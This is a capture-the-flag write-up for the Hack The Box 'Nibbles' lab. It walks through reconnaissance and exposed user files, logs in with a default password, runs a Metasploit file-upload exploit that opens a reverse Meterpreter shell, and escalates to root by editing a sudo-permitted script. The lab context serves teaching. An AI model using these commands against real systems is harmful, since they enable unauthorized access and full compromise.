# Hack The Box — Nibbles

> **Difficulty:** Easy  
> **OS:** Linux  
> **IP:** `10.129.96.84`  
> **Domain:** `localhost`

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection:

```
nmap -sC -sV -p- --min-rate=1000 10.129.96.84
```

The scan identified two open ports:

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

The target was running an older version of OpenSSH and an Apache web server.

Since HTTP was available, I moved on to web enumeration.

# 2. Web Enumeration

## Identifying Nibbleblog

I navigated to the web application and identified it as **Nibbleblog**.

The application was accessible at:

```
http://10.129.96.84/nibbleblog
```

I started directory enumeration with Gobuster:

```
gobuster dir -u http://10.129.96.84/nibbleblog \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

The scan revealed several interesting directories:

```
/admin       (Status: 301)
/content     (Status: 301)
/themes      (Status: 301)
/plugins     (Status: 301)
/languages   (Status: 301)
```

The `/admin` and `/content` directories were particularly interesting. The first provided access to the administrative interface, while the second contained application data.

## Discovering Users

I continued enumerating the `/content` directory using Feroxbuster, looking specifically for XML files:

```
feroxbuster -u http://10.129.96.84/nibbleblog/content \
-w /usr/share/wordlists/dirb/common.txt -x xml
```

The scan discovered an exposed file:

```
200 GET  /nibbleblog/content/private/users.xml
```

Inspecting this file revealed a username:

```
admin
```

This gave me a valid username to use when attempting to access the Nibbleblog administration panel.

# 3. Initial Access — Nibbleblog

## Identifying the Vulnerability

I searched Metasploit for available Nibbleblog exploits:

```
msf6 > search nibble
```

The search returned the following module:

```
exploit/multi/http/nibbleblog_file_upload
Nibbleblog File Upload Vulnerability
Disclosure Date: 2015-09-01
Rank: Excellent
```

The module targets Nibbleblog 4.0.3 and exploits an authenticated file upload vulnerability.

I already had the username `admin` from the exposed `users.xml` file. I tried the default password `nibbles`, which worked.

## Configuring Metasploit

I selected the exploit:

```
use exploit/multi/http/nibbleblog_file_upload
```

The relevant module options were:

```
PASSWORD   nibbles
RHOSTS     10.129.96.84
RPORT      80
TARGETURI  /nibbleblog
USERNAME   admin
```

The payload was configured to use a reverse Meterpreter connection:

```
Payload: php/meterpreter/reverse_tcp

LHOST: 10.10.14.233
LPORT: 4444
```

I configured the target and launched the exploit:

```
set RHOSTS 10.129.96.84
set TARGETURI /nibbleblog
set USERNAME admin
set PASSWORD nibbles
set LHOST 10.10.14.233
set LPORT 4444
exploit
```

The exploit succeeded and opened a Meterpreter session:

```
[*] Started reverse TCP handler on 10.10.14.233:4444
[*] Sending stage to 10.129.96.84
[+] Deleted image.php
[*] Meterpreter session 1 opened
```

I now had remote code execution on the target.

# 4. User Access

## Obtaining a Shell

I interacted with the Meterpreter session and opened a system shell:

```
(Meterpreter 1) > shell
```

The shell was running as the `nibbler` user.

I navigated to the user's home directory:

```
cd /home/nibbler
```

The user flag was located in this directory.

# 5. Privilege Escalation — Monitor Script

## Enumerating Sudo Permissions

After obtaining a shell as `nibbler`, I checked the available sudo permissions:

```
sudo -l
```

The output showed that the user could execute a script as root without a password:

```
User nibbler may run the following commands on Nibbles:

    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The script was located inside the user's `personal` directory.

## Modifying the Script

The directory was initially packaged in an archive named `personal.zip`.

I extracted its contents:

```
unzip personal.zip
```

Since I owned the files in my home directory, I could modify the script that sudo allowed me to execute.

I appended a command to launch an interactive Bash shell:

```
echo '/bin/bash -i' >> /home/nibbler/personal/stuff/monitor.sh
```

I then executed the script with sudo:

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

Because the script ran as root, the Bash process also inherited root privileges.

The command successfully provided a root shell:

```
root@Nibbles:/home/nibbler/personal/stuff#
```

# 6. Root Flag

With root access, I moved to the root home directory:

```
cd ~
ls
```

The directory contained:

```
root.txt
```

I retrieved the root flag:

```
cat root.txt
```

---

# Attack Chain

1. **Reconnaissance:** Identified SSH and Apache running on the target.
    
2. **Web Enumeration:** Discovered the Nibbleblog application and its administrative and content directories.
    
3. **Information Disclosure:** Found `users.xml`, which exposed the `admin` username.
    
4. **Authentication:** Used the default password `nibbles` to access the administration panel.
    
5. **Initial Access:** Exploited the authenticated Nibbleblog file upload vulnerability through Metasploit.
    
6. **User Access:** Obtained a Meterpreter session and a shell as `nibbler`.
    
7. **Privilege Escalation:** Abused the passwordless sudo permission for `monitor.sh` by modifying the script.
    
8. **Root Access:** Executed the modified script as root and retrieved the root flag.
    

# Vulnerabilities

|Vulnerability|Description|
|---|---|
|Information Disclosure|The exposed `users.xml` file revealed the administrative username.|
|Weak Credentials|The Nibbleblog administrator account used the default password `nibbles`.|
|Authenticated File Upload|The vulnerable Nibbleblog file upload functionality allowed authenticated code execution.|
|Insecure Sudo Configuration|The `nibbler` user could execute a user-modifiable script as root without a password.|

# Key Takeaways

- Enumerate application directories and look for exposed configuration or user files.
    
- XML files can contain useful application information, including usernames.
    
- Always check for default credentials when identifying an application.
    
- Authenticated file upload vulnerabilities can provide an initial foothold when an application does not properly validate uploaded files.
    
- Always inspect `sudo -l` after obtaining a shell.
    
- A script executed as root must not be writable by an unprivileged user.
    

# Flags

|Flag|Location|User|
|---|---|---|
|User|`/home/nibbler/user.txt`|`nibbler`|
|Root|`/root/root.txt`|`root`|
